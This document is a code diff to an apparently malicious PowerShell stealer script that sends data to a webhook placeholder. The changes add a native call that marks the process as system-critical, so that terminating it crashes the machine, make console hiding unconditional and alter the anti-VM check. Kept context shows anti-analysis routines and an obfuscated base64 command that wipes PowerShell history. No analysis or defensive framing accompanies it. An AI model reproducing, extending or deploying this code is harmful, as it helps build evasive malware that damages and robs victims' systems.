@@ -23,6 +23,29 @@ function KDMUTEX {
 
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public static class ProcessUtility
+{
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
+    public static void MakeProcessCritical()
+    {
+        Process.EnterDebugMode();
+        RtlSetProcessIsCritical(1, 0, 0);
+    }
+
+    public static void MakeProcessKillable()
+    {
+        RtlSetProcessIsCritical(0, 0, 0);
+    }
+}
+"@
+
 $webhook = "YOUR_WEBHOOK_HERE"
 $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 
@@ -36,18 +59,16 @@ function INVOKE-AC {
 }
 
 function Hide-Console {
-    if ($debug -eq $false) {
-        if (-not ("Console.Window" -as [type])) { 
-            Add-Type -Name Window -Namespace Console -MemberDefinition '
-                [DllImport("Kernel32.dll")]
-                public static extern IntPtr GetConsoleWindow();
-                [DllImport("user32.dll")]
-                public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-                '
-        }
-        $consolePtr = [Console.Window]::GetConsoleWindow()
-        $null = [Console.Window]::ShowWindow($consolePtr, 0)
+    if (-not ("Console.Window" -as [type])) { 
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+            [DllImport("Kernel32.dll")]
+            public static extern IntPtr GetConsoleWindow();
+            [DllImport("user32.dll")]
+            public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+            '
     }
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    $null = [Console.Window]::ShowWindow($consolePtr, 0)
 }
 
 function make_error_page {
@@ -165,7 +186,7 @@ function VMBYPASSER {
     }
     else { 
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Remove-Item $PSCommandPath -Force 
+        Exit 1
     }
 }
 
@@ -203,6 +224,7 @@ function Invoke-ANTITOTAL {
             ""
         }
     }
+    [ProcessUtility]::MakeProcessCritical()
     Invoke-TASKS
 }
 
@@ -883,6 +905,8 @@ if (INVOKE-AC -eq $true) {
     #removes history
     if ($debug) {
         Read-Host "Press Enter to continue..."
+    } else {
+        [ProcessUtility]::MakeProcessKillable()
     }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
